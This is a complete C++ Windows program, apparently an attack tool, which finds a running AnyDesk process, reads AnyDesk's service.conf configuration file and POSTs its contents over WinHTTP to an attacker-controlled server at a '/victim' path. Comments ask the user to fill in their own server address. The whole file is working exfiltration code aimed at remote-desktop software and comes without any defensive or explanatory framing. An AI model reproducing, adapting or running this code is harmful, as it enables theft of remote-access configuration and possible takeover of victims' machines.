#include <windows.h>
#include <iostream>
#include <stdlib.h>
#include <tlhelp32.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp")

using namespace std;

void check_path(const char* path) {
    DWORD result = GetFileAttributesA(path);

    if (result == INVALID_FILE_ATTRIBUTES) {
        cout << "File Not Found: " << path << endl;
        exit(1);
    }

    cout << "File Found in " << path << endl;
}

DWORD GetPid(LPCWSTR process) {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        cout << "[!] SnapShot Error" << endl;
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnapShot, &pe)) {
        do {
            if (wcscmp(process, pe.szExeFile) == 0) {
                CloseHandle(hSnapShot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapShot, &pe));
    }

    CloseHandle(hSnapShot);
    return 0;
}

BOOL SendFile(const char* path, const char* serverUrl) {
    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) {
        cout << "[!] WinHttpOpen Error: " << GetLastError() << endl;
        return FALSE;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.1.70", INTERNET_DEFAULT_HTTP_PORT, 0); // Enter your server address
    if (!hConnect) {
        cout << "[!] WinHttpConnect Error: " << GetLastError() << endl;
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/victim", NULL, // Enter your server's directory
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    if (!hRequest) {
        cout << "[!] WinHttpOpenRequest Error: " << GetLastError() << endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HANDLE hFile = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        cout << "[<->] Cannot Opening File: " << path << endl;
        cout << "[!] Error: " << GetLastError() << endl;

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return FALSE;
    }

    DWORD bytesRead;
    BYTE buffer[8192];
    BOOL result = ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
    CloseHandle(hFile);

    if (!result) {
        cout << "[-] Cannot Read File's Content" << endl;
        cout << "[!] Error: " << GetLastError() << endl;

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    result = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        buffer,
        bytesRead,
        bytesRead,
        0);

    if (!result) {
        cout << "[!] WinHttpSendRequest Error: " << GetLastError() << endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    WinHttpReceiveResponse(hRequest, NULL);
    cout << "[+] File Sent Successfully!" << endl;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return TRUE;
}

int main(int argc, char* argv[]) {
    LPCWSTR processname = L"AnyDesk.exe";
    char path[MAX_PATH] = "C:\\ProgramData\\AnyDesk\\service.conf";

    DWORD pid = GetPid(processname);

    if (pid == 0) {
        cout << "[!] Not Found " << processname << " in System" << endl;
        return -1;
    }

    check_path(path);

    if (!SendFile(path, "http://192.168.1.70/victim")) {
        cout << "[-] Failed to send the file." << endl;
        return -1;
    }

    return 0;
}
